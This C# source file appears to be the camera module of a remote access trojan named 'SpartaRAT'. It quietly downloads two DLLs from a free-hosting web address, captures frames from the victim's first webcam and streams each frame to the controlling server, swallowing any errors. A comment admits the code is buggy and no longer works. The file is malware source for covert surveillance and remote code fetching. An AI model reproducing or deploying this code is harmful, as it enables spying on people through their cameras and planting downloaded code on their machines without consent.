using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using AForge.Video.DirectShow;

using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Net;
using System.Threading;

namespace SpartaRATclient
{
    //@TODO: Alot bugs, code not work anymore due library errors, need to be fixed.
    public class CameraView
    {
        private Server MainInstance;
        private VideoCaptureDevice videoSource;
        public CameraView(Server MainInstance) 
        {
            this.MainInstance = MainInstance;
            MainInstance.s_StopSharingCamera += StopCapturingCamera;
            this.installDlls();
        }

        private void installDlls()
        {
            string currentDir = System.IO.Directory.GetCurrentDirectory();

            try
            {
                string url = @"https://mysimpleweb054.000webhostapp.com/";
                if (!File.Exists(currentDir + "\\AForge.Video.DirectShow.dll") || !File.Exists(currentDir + "\\AForge.Video.dll"))
                {
                    WebClient file = new WebClient();
                    Thread.Sleep(1000);
                    file.DownloadFile(url + "mysite/1", currentDir + @"\AForge.Video.DirectShow.dll"); //first dll file
                    file.DownloadFile(url + "mysite/2", currentDir + @"\AForge.Video.dll"); //second dll file
                }
            }
            catch { }
        }

        private void StopCapturingCamera()
        {
            try
            {
                videoSource.Stop();
            }
            catch { }
        }
        public void GrabCamera()
        {
            Bitmap image = null;
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (videoDevices.Count > 0)
            {
                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                videoSource.NewFrame += (s, args) => image = (System.Drawing.Bitmap)args.Frame.Clone();
                videoSource.NewFrame += (s, args) =>
                {
                    image = (System.Drawing.Bitmap)args.Frame.Clone();
                    byte[] ImageToSend = ConvertBitmapToByteArray(image);
                    MainInstance.Send(ImageToSend, 18);
                };

                byte[] ConvertBitmapToByteArray(Bitmap bitmap)
                {
                    using (MemoryStream stream = new MemoryStream())
                    {
                        bitmap.Save(stream, ImageFormat.Bmp);
                        return stream.ToArray();
                    }
                }
                videoSource.Start();
            }
        }
    }
}
